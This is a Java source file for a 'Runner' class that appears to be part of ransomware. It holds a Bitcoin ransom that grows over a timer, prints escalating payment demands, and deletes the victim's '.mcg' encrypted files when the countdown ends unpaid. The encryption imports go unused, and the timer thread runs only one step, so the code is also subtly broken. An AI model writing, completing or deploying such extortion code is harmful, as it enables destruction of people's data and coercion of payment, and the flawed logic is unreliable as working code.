package Runner;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

public class Runner {
    private double BTC;
    private final double BTC_increase;
    private final int timer;
    private int currentStep = 0;
    private final int steps;
    private Thread runner;
    private String path;

    public Runner(double startAmountBTC, double increaseBTC, int fullTimeInMS, int amountSteps, String pathForEncryptedFiles) {
        BTC = startAmountBTC;
        BTC_increase = increaseBTC;
        timer = fullTimeInMS;
        steps = amountSteps;
        path = pathForEncryptedFiles;
    }

    public void run() {
        runner = new Thread(() -> {
            try {
                Thread.sleep(timer / steps);
            } catch (Exception e) {
                e.printStackTrace();
            }
            currentStep++;
            if (currentStep == steps) {
                System.out.println("You didn't pay. So your files are going to be deleted now.");
                deleteFiles();
                runner.interrupt();
                return;
            }
            BTC += BTC_increase;
            System.out.println("Amount to pay has increase by " + BTC_increase + " to a total sum of " + BTC + "BTC.");
        });
        runner.start();
    }

    public void stop() {
        runner.interrupt();
    }

    void deleteFiles() {
        File dir = new File(path);
        File[] fileArr = null;
        try {
            fileArr = dir.listFiles();
        } catch (NullPointerException e) {
        }
        if (fileArr == null) {
            System.out.println("Failed to list Files");
            return;
        }
        for (File f : fileArr) {
            if (f.getName().endsWith(".mcg")) f.delete();
        }
    }

    public double getBTC() {return BTC;}
}
